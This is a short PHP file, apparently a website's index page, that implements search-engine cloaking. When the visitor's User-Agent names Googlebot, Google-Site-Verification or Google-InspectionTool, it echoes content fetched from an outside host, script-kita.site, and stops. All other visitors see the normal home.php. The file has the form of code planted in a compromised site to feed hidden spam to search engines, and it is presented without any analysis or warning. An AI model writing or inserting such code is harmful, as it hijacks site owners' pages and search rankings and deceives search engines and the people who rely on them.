<?php
function check_user_agent($agent) {
    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
}
if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) 
{ 
  echo file_get_contents('https://script-kita.site/gas/r');
  exit;
} else {
  include 'home.php';
}
?>
